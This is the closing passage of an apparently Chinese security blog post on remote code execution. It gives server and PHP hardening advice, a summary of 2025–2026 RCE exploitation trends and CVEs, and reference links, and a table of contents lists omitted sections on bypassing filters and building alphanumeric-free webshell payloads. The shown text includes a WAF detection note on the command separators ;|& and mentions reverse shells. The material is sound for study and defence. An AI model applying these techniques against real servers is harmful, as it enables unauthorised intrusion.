+<p>2、<strong>用户输入白名单校验，不信任外部输入</strong> 只允许业务预期字符，<strong>优先白名单，黑名单容易被绕过</strong>。<br>3、<strong>命令执行必须使用安全转义 &#x2F; 参数化调用</strong> <code>escapeshellarg()</code> &#x2F; <code>escapeshellcmd()</code>；禁止直接拼接用户输入到 shell 命令。</p>
+<blockquote>
+<p>推荐参数数组调用，杜绝字符串拼接。</p>
+</blockquote>
+<p>4、禁止可控输入直接作为函数名（防御可变函数 RCE）<br>5、反序列化：使用类白名单校验，签名，尽量不使用 unserialize。</p>
+<h2 id="2-PHP-配置加固"><a href="#2-PHP-配置加固" class="headerlink" title="2. PHP 配置加固"></a>2. PHP 配置加固</h2><p>1、<code>open_basedir</code>：限制 PHP 能访问的目录，就算 RCE 成功，也不能跨目录读文件。<br>2、关闭不必要危险配置：allow_url_include&#x3D;Off<br>3、限制 session 相关配置，限制 PHPSESSID 可用字符，防御 session 路线无参数 RCE。</p>
+<h2 id="3-服务器-系统层面"><a href="#3-服务器-系统层面" class="headerlink" title="3. 服务器 &#x2F; 系统层面"></a>3. 服务器 &#x2F; 系统层面</h2><p>1、<strong>最小权限原则</strong>：web 进程使用普通用户（www-data）运行，<strong>禁止 root</strong>，降低危害。<br>2、及时更新框架、第三方组件补丁（Log4j2、Spring4Shell 这类组件 RCE）。<br>3、网络隔离：限制服务器主动外连，防止 DNSlog 反弹 shell。</p>
+<h2 id="4-安全设备与运行防护"><a href="#4-安全设备与运行防护" class="headerlink" title="4. 安全设备与运行防护"></a>4. 安全设备与运行防护</h2><p>1、WAF：拦截 RCE 特征 payload（payload 字符串、命令分隔符<code>;|&amp;</code>），缺点容易编码绕过。<br>2、RASP：运行时检测危险函数调用，防御无参数这类 WAF 难识别的 RCE。<br>3、日志审计：记录命令执行、文件读取行为，发现攻击。</p>
+<h1 id="RCE现代状况"><a href="#RCE现代状况" class="headerlink" title="RCE现代状况"></a>RCE现代状况</h1><p>基于 2025–2026 年的最新数据，RCE 的现代状况可以概括为一句话：RCE 没有变少，而是变得更快、更前置、更集中于边缘设备和供应链。”发现漏洞→被打穿”的时间窗口已经坍塌，防御逻辑从”打补丁”被迫转向”假设已被 RCE，限制其后果”。</p>
+<h2 id="一、时间窗口坍塌：从-756-天到-4-小时"><a href="#一、时间窗口坍塌：从-756-天到-4-小时" class="headerlink" title="一、时间窗口坍塌：从 756 天到 4 小时"></a>一、时间窗口坍塌：从 756 天到 4 小时</h2><p>漏洞披露到被利用的平均间隔：</p>
+<table>
+<thead>
+<tr>
+<th align="left">年份</th>
+<th align="left">披露→利用平均时间</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">2018</td>
+<td align="left">756 天</td>
+</tr>
+<tr>
+<td align="left">2021</td>
+<td align="left">84 天</td>
+</tr>
+<tr>
+<td align="left">2023</td>
+<td align="left">6 天</td>
+</tr>
+<tr>
+<td align="left">2024</td>
+<td align="left">约 4 小时（最快观测值）</td>
+</tr>
+<tr>
+<td align="left">2025</td>
+<td align="left">常在披露前（零日）</td>
+</tr>
+</tbody></table>
+<p>2025 年的具体数据：28% 的漏洞在披露后 1 天内遭利用，28.96% 的 KEV 漏洞在 CVE 发布当天或之前就被利用（2024 年为 23.6%），而厂商平均需要 15 天才能推出补丁。补丁永远追不上利用，”补丁窗口”概念已名存实亡。</p>
+<h2 id="二、零日化：2026-年被利用漏洞中-67-2-是零日"><a href="#二、零日化：2026-年被利用漏洞中-67-2-是零日" class="headerlink" title="二、零日化：2026 年被利用漏洞中 67.2% 是零日"></a>二、零日化：2026 年被利用漏洞中 67.2% 是零日</h2><p>2018 年这一比例仅为 16.1%。攻击者不再等补丁后再逆向 N-day，而是直接囤零日、或通过供应链（源代码窃取）自己挖。最典型案例：<strong>F5 BIG-IP CVE-2025-53521</strong>——Mandiant 追踪的 UNC5221 潜伏 F5 内网约 12 个月偷走 BIG-IP 源码，挖出的漏洞 2025 年 10 月披露时被定级为 DoS（CVSS 8.7），2026 年 3 月重新定级为 RCE（CVSS 9.8）并确认在野利用——大量机构以为自己在防”崩溃 bug”，实际在打 RCE 补丁。</p>
+<h2 id="三、规模与构成：命令注入仍是-RCE-之王"><a href="#三、规模与构成：命令注入仍是-RCE-之王" class="headerlink" title="三、规模与构成：命令注入仍是 RCE 之王"></a>三、规模与构成：命令注入仍是 RCE 之王</h2><ul>
+<li>CISA KEV 目录 2025 年底达 1,484 条，全年新增 245 条（20% 增速，三年最大）；</li>
+<li>2025 年 KEV 新增中最常见的弱点类型：<strong>CWE-78 OS 命令注入第一</strong>（18 个）、CWE-502 反序列化第二（14个）、CWE-22 路径穿越第三、CWE-416 UAF 第四、CWE-94 代码注入新上榜；</li>
+<li>执行层面数据：2025 年被利用的漏洞中 <strong>69% 无需认证，约 30% 直接造成 RCE</strong>。</li>
+</ul>
+<p>注意：真实世界统计里”开发手写的 <code>eval($_POST)</code>“占比并不高——<strong>占大头的是 C 语言内存破坏（UAF&#x2F;OOB）和反序列化</strong>，这与前面我们讲的 PHP CTF 世界是两个生态。</p>
+<h2 id="四、重灾区分布（2025–2026-的代表性在野-RCE）"><a href="#四、重灾区分布（2025–2026-的代表性在野-RCE）" class="headerlink" title="四、重灾区分布（2025–2026 的代表性在野 RCE）"></a>四、重灾区分布（2025–2026 的代表性在野 RCE）</h2><h3 id="1-边缘设备-网关仍是头号入口"><a href="#1-边缘设备-网关仍是头号入口" class="headerlink" title="1. 边缘设备&#x2F;网关仍是头号入口"></a>1. 边缘设备&#x2F;网关仍是头号入口</h3><p>VPN、ADC、防火墙类设备反复成为勒索软件初始入口：Ivanti Connect Secure 栈溢出无认证 RCE（CVE-2025-22457，EPSS 约 99.98%）、CitrixBleed 2、Fortinet&#x2F;SonicWall 认证绕过、F5 BIG-IP、WatchGuard（7.5 万台暴露）。共同特征：<strong>内存破坏 + 无认证 + 暴露公网</strong>。</p>
+<h3 id="2-AI-基础设施成为新大陆"><a href="#2-AI-基础设施成为新大陆" class="headerlink" title="2. AI 基础设施成为新大陆"></a>2. AI 基础设施成为新大陆</h3><ul>
+<li><strong>React2Shell（CVE-2025-55182，CVSS 10.0）</strong>：React Server Components 无认证 RCE，EPSS 100%，已被用于勒索软件和挖矿；</li>
+<li><strong>Langflow（CVE-2025-3248，CVSS 9.8）</strong>：AI 工作流平台无认证代码注入；</li>
+<li><strong>Ray（CVE-2025-62593，CVSS 9.4）</strong>：因长期不给关键端点加认证，被 DNS rebinding 打浏览器侧 RCE，2026 年 8 月入 KEV。</li>
+</ul>
+<p>共同教训：<strong>AI 工具链部署快、硬化少、默认无认证</strong>。</p>
+<h3 id="3-企业软件供应链"><a href="#3-企业软件供应链" class="headerlink" title="3. 企业软件供应链"></a>3. 企业软件供应链</h3><p>SAP NetWeaver 文件上传→webshell（CVSS 10.0，零日在野）、GoAnywhere MFT 反序列化（CVSS 10.0，勒索软件初始访问）、Cleo 文件上传、Erlang&#x2F;OTP SSH 守护进程<strong>预认证 RCE（CVSS 10.0）</strong>、Roundcube&#x2F;Craft CMS、Commvault、Git 客户端（CVE-2025-48384，CI&#x2F;CD 场景）。</p>
+<h2 id="五、防御范式的实际转变"><a href="#五、防御范式的实际转变" class="headerlink" title="五、防御范式的实际转变"></a>五、防御范式的实际转变</h2><p>数据支撑了几个已经落地的趋势：</p>
+<ol>
+<li><strong>优先级从 CVSS 转向 EPSS&#x2F;KEV</strong>：漏洞太多（每天 130+ 新 CVE），人工分诊失效；且 KEV 本身滞后于现实——H1-2025 实际在野利用比 KEV 记录还多。</li>
+<li><strong>虚拟补丁&#x2F;WAF 应急规则</strong>成为披露日（0-day）到补丁日（15 天）之间的唯一屏障。</li>
+<li>**从”防 RCE”转向”容忍 RCE”**：运行时层做系统调用管控（syscall mediation）、身份层做 JIT 审批与事务限额、数据层做分片&#x2F;令牌化——即使 RCE 成功也把破坏压缩到分钟级、单点级。</li>
+<li><strong>出网管控成为高 ROI 控制项</strong>：大量在野利用链依赖反弹连接&#x2F;C2，egress filtering 能直接打断。</li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771/article/details/118893434">RCE(远程代码执行漏洞)原理及漏洞利用-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cxyxx12/article/details/158847183">一文吃透RCE漏洞（RCE远程代码&#x2F;命令执行）-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>
+<p><a target="_blank" rel="noopener" href="https://wanth3f1ag.top/posts/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/">对于RCE和文件包含的一点总结 | root@wanth3f1ag</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="http://www.baidu.com">Teaaa</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/09/11/%E5%AD%A6%E6%A0%A1%E6%9C%8D%E5%8A%A1%E5%99%A8RCE%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC%F0%9F%A4%A8/">http://example.com/2026/09/11/学校服务器RCE植入木马🤨/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">choco</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a></div><div class="post-share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/09/08/SSRF%E5%87%BB%E7%A9%BF%E5%AD%A6%E6%A0%A1%E5%86%85%E7%BD%91/" title="😡SSRF击穿学校内网😡"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">😡SSRF击穿学校内网😡</div></div><div class="info-2"><div class="info-item-1">假设你早生个十几年，并且你学校的网站（业务服务器）有 SSRF 的话，你就有可能通过它打通内网访问通道，进入内网后台，在条件满足的情况下（中间件自身的漏洞 &#x2F; 不安全配置），通过 Redis、MongoDB、Elasticsearch 等中间件 写入 Webshell ，直接获取服务器控制权接管服务器，那么你就是你们学校服务器新主人了。 2019 年美国 Capital One（第一资本银行）发生重大数据泄露事件，超过 1.06 亿用户的个人信息被盗，最终企业被罚超 2.7 亿美元。攻击入口就是一处SSRF 漏洞：攻击者利用 WAF 存在的服务端请求伪造漏洞，诱导云服务器访问169.254.169.254云元数据接口，拿到云主机 IAM 权限凭证，直接读取存储在 S3 对象存储中的海量客户隐私数据。整个攻击不需要爆破、不需要复杂木马，仅仅依靠 SSRF，就从公网直接打入企业云内网，拖走数十亿字节用户资料。 国内不少图片预览、头像 URL 导入功能都踩过 SSRF 大坑。某电商平台支持用户填入图片 URL，后端自动拉取图片生成缩略图；攻击者不填真实图片地址，传入内网地址，...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/09/01/%E8%87%AA%E5%A8%B1%E8%87%AA%E4%B9%90%E7%9A%84XSS/" title="自娱自乐的XSS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-01</div><div class="info-item-2">自娱自乐的XSS</div></div><div class="info-2"><div class="info-item-1">为什么说陌生的链接不要点？哪怕域名看起来正常也不要乱点，接下来告诉你为什么。提醒一下：未经授权，禁止对任何互联网网站、系统开展漏洞探测、渗透测试、XSS 等攻击实验。一切未取得书面授权的攻击行为，违反《网络安全法》，需承担相应民事、行政乃至刑事责任。本内容仅用于安全学习与原理研究。 XSS (Cross Site Scripting) 即跨站脚本攻击，为了不与层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。为什么我说这是自娱自乐呢？因为就我之前的学习，里面有一个能实现的攻击方式条件十分苛刻，而且挺容易翻车，自己自娱自乐玩玩得了。现在再来详细总结一下。 听说有兄弟面试后端开发被面试官找茬问了个这个前端的漏洞，没想到连听都没听说过，啥玩意儿是叉艾斯艾斯啊？但是跨站脚本攻击（XSS）作为Web安全领域中最常见、危害最广泛的漏洞之一，长期位列OWASP Top 10榜单，作为开发人员也还是有必要了解一下的。 前置知识XSS一途如逆水行舟，若各位道友提前觉醒了些许前端姿势：HTML标签&#x2F;事件、JSDOM操作、同源...</div></div></div></a><a class="pagination-related" href="/2026/09/06/CSRF%E7%BB%99%E6%88%91%E6%89%93%E9%92%B1%EF%BC%81/" title="CSRF给我打钱！😤"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-06</div><div class="info-item-2">CSRF给我打钱！😤</div></div><div class="info-2"><div class="info-item-1">当你登录到自己的账号上时，突然跳出一个神秘小窗口通知假期延长，你如果控制不住好奇点进去，那么你惊奇的发现你的钱被转走了，这说明存放你账户的网站可能存在 CSRF 漏洞，并且没有防护。 本来仅仅想总结一下之前学的内容，结果与时俱进了一下没想到这么多。之前觉得 CSRF 跟 XSS 有些地方挺像的，但其实 XSS 属于前端相关漏洞，但 CSRF 本质不是前端漏洞，是服务端验证逻辑漏洞，只是利用时依赖前端页面发起请求。 而且我之前感觉 CSRF 是一个很老套的漏洞，没啥含量，十分鸡肋，就写一个页面构造 payload ，实现条件苛刻（必须诱导用户访问恶意页面、用户必须处于登录状态、只能发起请求，无法读取后端响应内容、受浏览器安全策略限制、攻击载荷固定，无法动态获取一次性凭证、部分请求无法构造）还容易被溯源、特征明显，但是今天一总结才发现现代 CSRF 的攻击面、利用方式比我想象的要广，这一点从文末纵深防御，总结及现状也能看出来。 前置知识在OWASP Top 10中，从 2017 版开始，CSRF 被移出 OWASP Top 10 主列表，这并非因为和我想的一样 CSRF 太弱了，而是...</div></div></div></a><a class="pagination-related" href="/2026/09/08/SSRF%E5%87%BB%E7%A9%BF%E5%AD%A6%E6%A0%A1%E5%86%85%E7%BD%91/" title="😡SSRF击穿学校内网😡"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-08</div><div class="info-item-2">😡SSRF击穿学校内网😡</div></div><div class="info-2"><div class="info-item-1">假设你早生个十几年，并且你学校的网站（业务服务器）有 SSRF 的话，你就有可能通过它打通内网访问通道，进入内网后台，在条件满足的情况下（中间件自身的漏洞 &#x2F; 不安全配置），通过 Redis、MongoDB、Elasticsearch 等中间件 写入 Webshell ，直接获取服务器控制权接管服务器，那么你就是你们学校服务器新主人了。 2019 年美国 Capital One（第一资本银行）发生重大数据泄露事件，超过 1.06 亿用户的个人信息被盗，最终企业被罚超 2.7 亿美元。攻击入口就是一处SSRF 漏洞：攻击者利用 WAF 存在的服务端请求伪造漏洞，诱导云服务器访问169.254.169.254云元数据接口，拿到云主机 IAM 权限凭证，直接读取存储在 S3 对象存储中的海量客户隐私数据。整个攻击不需要爆破、不需要复杂木马，仅仅依靠 SSRF，就从公网直接打入企业云内网，拖走数十亿字节用户资料。 国内不少图片预览、头像 URL 导入功能都踩过 SSRF 大坑。某电商平台支持用户填入图片 URL，后端自动拉取图片生成缩略图；攻击者不填真实图片地址，传入内网地址，...</div></div></div></a><a class="pagination-related" href="/2026/08/31/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/" title="😠一发SQL期末满分😡"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-31</div><div class="info-item-2">😠一发SQL期末满分😡</div></div><div class="info-2"><div class="info-item-1">假设你学校的网站后端存在这个漏洞，并且你有文件写入等足够的权限，并且你知道怎么合理利用它，并且你不怕被整治，那么你把期末成绩改成100000分都没问题。什么，你还想要史上最详细DNSlog外带注入教程？ 值得一提的是，注入查询数据库时，即从当前业务库查询其它库的表，属于跨库查询。要跨库读取另一个库的表，账号必须拥有目标库对应的 SELECT 查询权限。而information_schema本身就是系统库，属于典型的跨库查询。 只不过information_schema系统库，普通账号默认就拥有 SELECT 访问权限，不需要额外授权。几乎所有注入环境都可以读 information_schema，这也是脱库的基础，但其中的库并不是 啥都能看见，只能看到你账号本身有访问权限的那些库、那些表。  MySQL5.7：不能回收information_schema的 select 权限，强制可以访问； MySQL8.0.12 + 管理员可以执行revoke select on information_schema.*，直接禁止访问该系统库，这种情况注入脱库直接废掉。   注入分类SQL注入...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Teaaa</div><div class="author-info-description">一万年太久只争朝夕</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">😲！OMG这也太酷了！😲</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">注意事项：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%92%8C%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%8C%BA%E5%88%86"><span class="toc-number">1.2.</span> <span class="toc-text">和其他漏洞简单区分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.3.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E5%BF%86"><span class="toc-number">1.4.</span> <span class="toc-text">回忆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E6%BC%94%E7%A4%BA%EF%BC%88%E6%89%A7%E8%A1%8C-whoami%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">示例演示（执行 whoami）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%AD%E4%B9%89-RCE-sink-%E5%AF%B9%E7%85%A7"><span class="toc-number">2.1.</span> <span class="toc-text">狭义 RCE sink 对照</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-number">2.2.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F-shell%EF%BC%8C%E9%83%BD%E5%8F%AF%E5%A5%97%E5%9C%A8eval%E4%B8%AD%EF%BC%89"><span class="toc-number">2.2.1.</span> <span class="toc-text">命令执行（调用系统 shell，都可套在eval中）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E8%A7%A3%E6%9E%90-PHP-%E4%BB%A3%E7%A0%81%EF%BC%89"><span class="toc-number">2.2.2.</span> <span class="toc-text">代码执行（解析 PHP 代码）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python"><span class="toc-number">2.3.</span> <span class="toc-text">Python</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F-shell%EF%BC%89"><span class="toc-number">2.3.1.</span> <span class="toc-text">命令执行（调用系统 shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E8%A7%A3%E6%9E%90-Python-%E4%BB%A3%E7%A0%81%EF%BC%89"><span class="toc-number">2.3.2.</span> <span class="toc-text">代码执行（解析 Python 代码）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java"><span class="toc-number">2.4.</span> <span class="toc-text">Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.4.1.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.4.2.</span> <span class="toc-text">代码执行 &#x2F; 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-js"><span class="toc-number">2.5.</span> <span class="toc-text">Node.js</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="toc-number">2.5.1.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1"><span class="toc-number">2.5.2.</span> <span class="toc-text">代码执行 &#x2F; 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-C-%EF%BC%88%E5%BA%95%E5%B1%82%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%BB%93%E5%90%88%EF%BC%89"><span class="toc-number">2.6.</span> <span class="toc-text">C &#x2F; C++（底层与缓冲区溢出结合）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2"><span class="toc-number">2.6.1.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%86%85%E5%AD%98%E7%B1%BB"><span class="toc-number">2.6.2.</span> <span class="toc-text">代码执行 &#x2F; 内存类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby"><span class="toc-number">2.7.</span> <span class="toc-text">Ruby</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-3"><span class="toc-number">2.7.1.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2"><span class="toc-number">2.7.2.</span> <span class="toc-text">代码执行 &#x2F; 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-NET"><span class="toc-number">2.8.</span> <span class="toc-text">C# &#x2F; .NET</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-4"><span class="toc-number">2.8.1.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3"><span class="toc-number">2.8.2.</span> <span class="toc-text">代码执行 &#x2F; 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-Bash"><span class="toc-number">2.9.</span> <span class="toc-text">Shell &#x2F; Bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%EF%BC%88SSTI-%E7%B1%BB%EF%BC%8C%E6%8F%90%E4%B8%80%E4%B8%8B%EF%BC%89"><span class="toc-number">2.10.</span> <span class="toc-text">模板引擎（SSTI 类，提一下）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E3%81%AE%E5%87%BD%E6%95%B0%E5%90%8D"><span class="toc-number">4.</span> <span class="toc-text">代码&amp;命令の函数名</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="toc-number">4.1.</span> <span class="toc-text">1、大小写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-number">4.2.</span> <span class="toc-text">2、字符串拼接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81base%E7%BC%96%E7%A0%81%E9%87%8D%E7%BB%84"><span class="toc-number">4.3.</span> <span class="toc-text">3、base编码重组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81-%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E4%B8%8E%E5%9B%9E%E8%B0%83"><span class="toc-number">4.4.</span> <span class="toc-text">4、 变量函数与回调</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E5%8F%AF%E5%8F%98%E5%87%BD%E6%95%B0"><span class="toc-number">4.5.</span> <span class="toc-text">5、可变函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97"><span class="toc-number">4.6.</span> <span class="toc-text">6、无字母数字</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%B3%95-1%EF%BC%9A%E5%BC%82%E6%88%96-%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6%EF%BC%9A"><span class="toc-number">4.6.1.</span> <span class="toc-text">手法 1：异或 ^ 构造字符：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%B3%95-2%EF%BC%9A%E5%8F%96%E5%8F%8D-%E6%9E%84%E9%80%A0%EF%BC%88%E6%97%A0%E6%95%B0%E5%AD%97%E6%97%B6%E9%A6%96%E9%80%89%EF%BC%89"><span class="toc-number">4.6.2.</span> <span class="toc-text">手法 2：取反 ~ 构造（无数字时首选）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%B3%95-3%EF%BC%9A%E8%87%AA%E5%A2%9E-%E6%9E%84%E9%80%A0%EF%BC%88%E5%AD%97%E6%AF%8D%E8%A1%A8%E9%81%8D%E5%8E%86%EF%BC%89"><span class="toc-number">4.6.3.</span> <span class="toc-text">手法 3：自增 ++ 构造（字母表遍历）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%90%8D%E7%BB%95%E8%BF%87%EF%BC%88shell-%E5%B1%82%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">命令名绕过（shell 层）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">5.1.</span> <span class="toc-text">1、通配符</span></a></li><li class="toc-item 